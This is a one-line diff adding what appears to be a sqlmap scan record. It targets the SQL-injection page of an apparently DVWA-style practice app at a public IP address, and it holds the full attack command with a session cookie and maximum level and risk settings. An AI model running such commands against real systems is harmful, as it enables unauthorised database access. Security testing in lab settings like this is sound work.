@@ -1,0 +1,1 @@
+http://54.74.29.28/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://54.74.29.28/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=security=low; PHPSESSID=qapvb9dqlmlmq91elr2q936675" --batch --level=5 --risk=3 -o --output-dir=results/sqlmap-sqli
